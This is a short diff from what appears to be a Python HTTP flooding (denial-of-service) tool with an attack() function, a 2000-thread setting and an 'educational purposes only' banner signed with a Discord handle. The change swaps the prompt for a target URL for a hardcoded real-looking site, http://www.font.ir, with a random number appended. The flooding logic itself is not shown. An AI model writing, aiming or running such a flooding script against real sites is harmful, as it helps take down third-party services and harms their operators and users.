@@ -17,7 +17,7 @@ def attack():
           
 if __name__ == "__main__":
     print("Proxy scraper + randomised useragents coming soon! :tm:\nMade for educational purposes only | nasus#5311\n")
-    url = input("\nURL: ")
+    url = "http://www.font.ir"
     num_threads = '2000'
     num_requests = '1'
     url = url + str(random.randint(0, 100))
